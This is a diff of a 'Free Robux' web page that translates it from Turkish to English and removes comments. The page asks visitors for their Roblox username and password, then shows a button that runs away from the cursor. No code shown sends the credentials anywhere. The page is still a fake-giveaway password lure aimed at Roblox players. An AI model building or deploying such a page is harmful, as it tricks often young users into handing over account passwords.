@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <title>Bedava Robux</title>
+  <title>Free Robux</title>
   <style>
     body {
       margin: 0;
@@ -62,12 +62,12 @@
   </style>
 </head>
 <body>
-  <h1>Bedava Robux İçin Roblox Adınızı ve Şifrenizi Girin</h1>
+  <h1>Enter Your Roblox Name and Password for Free Robux</h1>
   <div class="container">
-    <input type="text" id="roblox-name" placeholder="Roblox Adınızı Girin">
-    <input type="password" id="roblox-password" placeholder="Roblox Şifrenizi Girin">
-    <button id="submit">Gönder</button>
-    <button id="robux-button" class="robux-button">Robux Hazır Hesaba Aktarmak İçin Tıkla</button>
+    <input type="text" id="roblox-name" placeholder="Enter Your Roblox Name">
+    <input type="password" id="roblox-password" placeholder="Enter Your Roblox Password">
+    <button id="submit">ENTER</button>
+    <button id="robux-button" class="robux-button">Your Robux is Ready, Click to Transfer Your Robux to Your Account</button>
   </div>
 
   <script>
@@ -80,7 +80,7 @@
 
 
     submitButton.addEventListener('click', () => {
-      // Giriş alanları ve "Gönder" butonunu gizle
+
       robloxName.classList.add('hidden');
       robloxPassword.classList.add('hidden');
       submitButton.classList.add('hidden');
@@ -101,13 +101,11 @@
         const distY = e.clientY - buttonY;
         const distance = Math.sqrt(distX * distX + distY * distY);
 
-        // Eğer mesafe belirli bir eşiğin altına düşerse buton kaçmaya başlasın
         if (distance < threshold) {
           const moveAmount = (threshold - distance) / threshold * maxMove;
           const moveX = (distX / distance) * moveAmount;
           const moveY = (distY / distance) * moveAmount;
 
-          // Butonun yeni pozisyonunu belirle
           robuxButton.style.transform = `translate(${moveX}px, ${moveY}px)`;
         } else {
      
